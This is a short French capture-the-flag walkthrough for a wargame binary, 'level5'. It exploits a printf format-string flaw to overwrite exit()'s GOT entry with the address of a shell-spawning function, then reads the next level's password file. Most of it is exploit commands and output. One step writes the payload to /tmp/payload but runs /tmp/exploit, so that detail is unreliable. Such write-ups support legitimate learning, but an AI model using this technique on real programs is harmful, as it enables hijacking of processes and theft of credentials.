on tombe sur 2 fonction o() et n()
o() contient l'execution d'un shell donc il faut trouver le moyen de l'executer

on vas s'appuyer sur la fonction exit() dans la fonction n()
on sait qu'il y a un tableau de fonction nommer GOT qui contient les adresse reelle des fonctions externes

on voit que la meme faille qu'au niveau precedent est presente printf() passe directement une variable d'entrer on va s'appuyer
dessus pour reecrire dans GOT l'adresse qui est cense mene vers le exit() externe pour rediriger plutot vers o()

objdump -R level5 | grep exit pour trouver l'adresse de exit dans GOT

08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit


(gdb) info function o pour trouver l'adresse de o()

0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux

on a donc l'adresse de exit() dans GOT et o() :
exit = 08049838
o = 0x080484a4

python -c 'print "eeee %x %x %x %x"' | ./level5

eeee 200 b7fd1ac0 b7ff37d0 65656565

on voit que le printf stock le buffer a la 4eme place de la stack

on converti l'adresse de o en decimal

0x080484a4 = 134513828

nous avons tout en main pour construire le payload

Donc on reecrit l'adresse de exit dans GOT pour qu'elle pointe vers la fonction o

python -c 'print ("\x38\x98\x04\x08" + "%134513824d%4$n")' > /tmp/payload

cat /tmp/exploit - | ./level5

le shell est execute

cat /home/user/level6/.pass